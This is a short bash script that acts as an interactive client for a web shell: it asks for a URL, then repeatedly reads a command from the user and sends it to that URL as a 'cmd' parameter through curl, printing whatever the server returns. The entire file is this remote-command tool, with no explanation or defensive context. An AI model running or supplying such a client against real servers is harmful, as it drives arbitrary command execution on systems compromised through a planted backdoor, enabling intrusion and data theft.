#!/bin/bash

read -p "Enter URL: " url
echo
command=""

while [ "$command" != "y" ]; do
  read -p "Enter command (y to exit):" command

  if [ "$command" = "y" ]; then
    break
  fi

  #output=$(curl -s "$url?cmd=$command" | strings)
  output=$(curl -sG --data-urlencode "cmd=$command" "$url" | strings) 
  echo "$output"
  echo
done
